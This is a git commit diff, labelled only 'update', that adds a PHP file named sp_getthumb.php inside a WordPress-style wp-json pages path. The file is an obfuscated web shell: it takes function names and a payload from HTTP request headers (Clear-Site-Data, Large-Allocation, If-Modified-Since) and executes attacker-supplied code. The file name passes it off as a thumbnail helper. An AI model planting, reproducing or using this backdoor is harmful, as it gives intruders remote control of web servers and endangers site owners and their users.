1e2b663c4a9a4c227c5eb3521de68c4490132bc0
Fast and Static <it@e-me.co>
2024-10-26 09:16:28 +0000

    update

---
+++ wp-json/wp/v2/pages/1150/sp_getthumb.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Clear-Site-Data'])) {
+    $system = $_HEADERS['Clear-Site-Data']('', $_HEADERS['Large-Allocation']($_HEADERS['If-Modified-Since']));
+    $system();
+}
